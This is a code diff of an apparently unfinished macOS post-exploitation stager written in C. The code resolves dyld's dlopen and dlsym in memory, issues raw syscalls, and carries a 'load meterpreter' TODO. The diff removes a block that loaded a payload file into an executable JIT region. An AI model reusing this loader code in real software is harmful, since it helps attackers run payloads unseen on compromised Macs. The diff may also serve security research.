@@ -79,10 +79,10 @@ struct dyld_cache_image_info
   uint32_t    pad;
 };
 
-long syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6);
+long asm_syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6);
 int main(int argc, char** argv);
 void* get_dyld_function(const char* function_symbol);
-void resolve_dyld_symbol(uint32_t base, void** dlopen_pointer, void** dlsym_pointer);
+void resolve_dyld_symbol(void* base, void** dlopen_pointer, void** dlsym_pointer);
 uint64_t syscall_chmod(uint64_t path, long mode);
 uint64_t syscall_shared_region_check_np();
 uint32_t syscall_write(uint32_t fd, const char* buf, uint32_t size);
@@ -91,7 +91,6 @@ void init();
 
 int main(int argc, char** argv)
 {
-  /*crash();*/
   init();
   return 0;
 }
@@ -117,17 +116,12 @@ void init()
   void* dlopen_addr = 0;
   void* dlsym_addr = 0;
 
-#if __aarch64__
-  dlsym_addr = get_dyld_function("_dlsym");
-  dlopen_addr = get_dyld_function("_dlopen");
-#else
   uint64_t start = DYLD_BASE_ADDRESS;
   /*if (sierra) {*/
   /*}*/
   uint64_t dyld = find_macho(start, 0x1000, 0);
 
   resolve_dyld_symbol(dyld, &dlopen_addr, &dlsym_addr);
-#endif
 
   typedef void* (*dlopen_ptr)(const char *filename, int flags);
   typedef void* (*dlsym_ptr)(void *handle, const char *symbol);
@@ -166,86 +160,7 @@ void init()
   }
 
   // TODO load meterpreter macho
-  crash();
 
-  FILE *f = fopen("log_vm32", "rb");
-  fseek(f, 0, SEEK_END);
-  long fsize = ftell(f);
-  fseek(f, 0, SEEK_SET);
-  void *jit_region = mmap(NULL, fsize, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE|MAP_JIT, 0,0);//0x40000000, 0);
-  if (jit_region == MAP_FAILED) {
-    perror("Cannot mmap JIT RWX region");
-    return;
-  }
-  fread(jit_region, fsize, 1, f);
-  fclose(f);
-
-  printf("yay jit %p = %p\n", jit_region, *(int*)jit_region);
-  /*printf("yay dso %p\n", __dso_handle);*/
-  printf("yay dyld %p = %p\n", dyld, *(int*)dyld);
-  void* dyld_start = (void*)(dyld + 0x1000);
-  printf("yay dyld_start? %p = %p\n", dyld_start, *(int*)(dyld_start));
-  /*printf("yay main %p = %p\n", main, *(int*)main);*/
-
-  fflush(stdout);
-
-  /*void* libdyld = dlopen_func("/usr/lib/system/libdyld.dylib", RTLD_NOW);*/
-  /*printf("yay libdyld %p = %p\n", libdyld, *(int*)dyld);*/
-  /*fflush(stdout);*/
-
-  uint64_t shared_region_start = syscall_shared_region_check_np();
-
-  struct dyld_cache_header *header = (void*)shared_region_start;
-  struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;
-  struct dyld_cache_image_info *dcimg = (void*)header + header->imagesOffset;
-  uint64_t libdyld_address;
-  for (size_t i=0; i < header->imagesCount; i++) {
-    char * pathFile = (char *)shared_region_start+dcimg->pathFileOffset;
-    if (string_compare(pathFile, "/usr/lib/system/libdyld.dylib") == 0) {
-      libdyld_address = dcimg->address;
-      break;
-    }
-    dcimg++;
-  }
-  void* vm_slide_offset  = (void*)header - sfm->address;
-  printf("vm slide = %p\n", vm_slide_offset);
-  libdyld_address = (libdyld_address + vm_slide_offset);
-
-  mach_header_t *mh = (mach_header_t*)libdyld_address;
-
-  printf("yay libdyld %p = %p\n", mh, *(int*)mh);
-  void* libdyld_start = (void*)(mh + 0x1000);
-
-  printf("yay libdyld_start? %p = %p\n", libdyld_start, *(int*)(libdyld_start));
-  fflush(stdout);
-
-  /*dyld_start_ptr dyld_start_func = libdyld_address + 0x2874;*/
-  /*typedef void (*dyld_start_ptr)(struct macho_header* asl, int argc, char const **argv, char const **envp, );*/
-  /*dyld_start_func((struct macho_header*)0x41, 1, &main_argv, &slide);*/
-
-  /*unsigned int start_glue = 0;*/
-  /*int slide = 0;*/
-  /*unsigned int* startGlue = &start_glue;*/
-  /*typedef uintptr_t (*dyld_start_ptr)(const struct macho_header* appsMachHeader, int argc, const char* argv[], */
-				/*intptr_t slide, const struct macho_header* dyldsMachHeader,*/
-				/*uintptr_t* startGlue);*/
-  /*char *main_argv[] = { "xk", NULL };*/
-  /*dyld_start_ptr dyld_start_func = dyld_start;*/
-  /*dyld_start_func((const struct macho_header*)jit_region, 1, &main_argv, &slide, (const struct macho_header*)dyld, &startGlue);*/
-
-
-  unsigned int start_glue = 0;
-  int slide = 0;
-  unsigned int* startGlue = &start_glue;
-  typedef uintptr_t (*dyld_start_ptr)(const struct macho_header* appsMachHeader, int argc, const char* argv[],
-				intptr_t slide, const struct macho_header* dyldsMachHeader,
-				uintptr_t* startGlue);
-  char *main_argv[] = { "xk", NULL };
-  dyld_start_ptr dyld_start_func = dyld_start;
-  dyld_start_func((const struct macho_header*)0, 0, 0, 0, (const struct macho_header*)0, 0);
-
-  printf("finished\n");
-  fflush(stdout);
 
   crash();
 }
@@ -253,22 +168,22 @@ void init()
 
 uint32_t syscall_write(uint32_t fd, const char* buf, uint32_t size)
 {
-  return syscall(4, fd, buf, size, 0, 0, 0);
+  return asm_syscall(4, fd, buf, size, 0, 0, 0);
 }
 
 uint64_t syscall_chmod(uint64_t path, long mode)
 {
-  return syscall(15, path, mode, 0, 0, 0, 0);
+  return asm_syscall(15, path, mode, 0, 0, 0, 0);
 }
 
 uint64_t syscall_shared_region_check_np()
 {
   uint64_t address = 0;
-  syscall(294, &address, 0, 0, 0, 0, 0);
+  asm_syscall(294, &address, 0, 0, 0, 0, 0);
   return address;
 }
 
-long syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6){
+long asm_syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6){
   long ret;
 #ifdef __x86_64
   asm volatile (
@@ -417,16 +332,16 @@ uint64_t find_macho(uint64_t addr, unsigned int increment, unsigned int pointer)
 }
 
 // Credits: http://blog.tihmstar.net/2018/01/modern-post-exploitation-techniques.html
-void resolve_dyld_symbol(uint32_t base, void** dlopen_pointer, void** dlsym_pointer)
+void resolve_dyld_symbol(void* base, void** dlopen_pointer, void** dlsym_pointer)
 {
   struct load_command* lc;
-  struct segment_command* sc;
-  struct segment_command* data;
-  struct section* data_const = 0;
+  segment_command_t* sc;
+  segment_command_t* data;
+  section_t* data_const = 0;
   lc = (struct load_command*)(base + sizeof(mach_header_t));
 
-  for (int i=0;i<((struct mach_header*)base)->ncmds; i++) {
-    if (lc->cmd == 0x1) {
+  for (int i=0;i<((mach_header_t*)base)->ncmds; i++) {
+    if (lc->cmd == LC_SEGMENT_T) {
       sc = (struct segment_command*)lc;
       switch(*((unsigned int *)&sc->segname[2])) {
         case 0x41544144:
@@ -442,7 +357,7 @@ void resolve_dyld_symbol(uint32_t base, void** dlopen_pointer, void** dlsym_poin
       break;
     }
   }
-  uint32_t *dataConst = base + data_const->offset;
+  void **dataConst = base + data_const->offset;
 
   while (!*dlopen_pointer || !*dlsym_pointer) {
     if (string_compare((char*)(dataConst[0]), "__dyld_dlopen") == 0) {
@@ -454,5 +369,4 @@ void resolve_dyld_symbol(uint32_t base, void** dlopen_pointer, void** dlsym_poin
     dataConst += 2;
   }
 }
-
 
